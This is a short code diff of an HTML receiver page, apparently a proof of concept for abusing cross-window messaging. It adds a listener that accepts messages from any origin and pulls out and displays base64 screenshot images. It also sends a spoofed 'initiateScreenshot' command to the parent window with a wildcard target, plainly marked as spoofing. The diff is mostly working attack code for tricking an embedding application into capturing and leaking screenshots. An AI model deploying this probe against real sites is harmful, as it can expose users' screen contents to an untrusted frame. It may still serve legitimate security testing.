@@ -3,12 +3,31 @@
   <body>
     <h1>Receiver Loaded</h1>
     <script>
+      let log = [];
+
       window.addEventListener("message", (e) => {
-        alert("📥 Received from parent: " + JSON.stringify(e.data));
+        console.log("🔴 FULL MESSAGE RECEIVED:", e.data);
+        log.push(e.data);
+
+        // Try to detect potential screenshot blobs
+        const str = JSON.stringify(e.data);
+        if (str.length > 500 && str.includes("data:image/png;base64")) {
+          alert("⚠️ Screenshot Data Detected!");
+          const img = new Image();
+          img.src = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/)[0];
+          document.body.appendChild(img);
+        } else {
+          alert("📥 Message:\n" + str.slice(0, 600) + (str.length > 600 ? "..." : ""));
+        }
       }, false);
 
-      // Try to send a message to the parent (spoofed)
-      window.parent.postMessage("👋 Hello from receiver", "*");
+      // Also attempt to spoof screenshot requests back
+      setTimeout(() => {
+        window.parent.postMessage({
+          type: "feedback",
+          command: "initiateScreenshot"
+        }, "*");
+      }, 3000);
     </script>
   </body>
 </html>
